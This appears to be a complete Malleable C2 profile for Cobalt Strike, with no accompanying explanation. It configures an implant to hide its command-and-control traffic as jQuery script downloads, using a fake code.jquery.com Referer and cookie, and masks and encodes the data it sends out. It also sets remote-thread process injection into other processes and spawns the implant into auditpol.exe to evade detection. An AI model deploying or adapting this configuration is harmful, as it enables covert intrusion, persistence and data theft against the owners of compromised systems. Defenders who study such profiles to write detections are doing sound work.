set sleeptime "13967";
set jitter "50";
set spawnto_x86 "%windir%\syswow64\auditpol.exe";
set spawnto_x64 "%windir%\sysnative\auditpol.exe";
set useragent "Mozilla/5.0 (X11; Linux x86_64:75.0) Gecko/20100101 Firefox/75.0";

http-get {
    set uri "/jquery-3.3.1.min.js";
    set verb "GET";

    server {

        output {
            append "";
            prepend "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";
            prepend "";
            base64url;
            mask;
            print;
        }
    }

    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Referer" "http://code.jquery.com/";
        header "Accept-Encoding" "gzip, deflate";

        metadata {
            base64url;
            prepend "__cfduid=";
            header "Cookie";
        }
    }
}

http-post {
    set verb "POST";
    set uri "/jquery-3.3.2.min.js";

    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Referer" "http://code.jquery.com/";
        header "Accept-Encoding" "gzip, deflate";

        id {
            mask;
            base64url;
            parameter "__cfduid";
        }

        output {
            mask;
            base64url;
            print;
        }
    }
}

stage {
    set cleanup "1";
    set sleep_mask "156264";
}

process-inject {
    set startrwx "false";
    set userwx "false";
    set min_alloc "8780";

    transform-x86 {
        append "\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    }

    transform-x64 {
        append "\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    }

    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart+0x2285";
        SetThreadContext;
        CreateRemoteThread;
        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";
        RtlCreateUserThread;
    }
    set allocator "VirtualAllocEx";
}
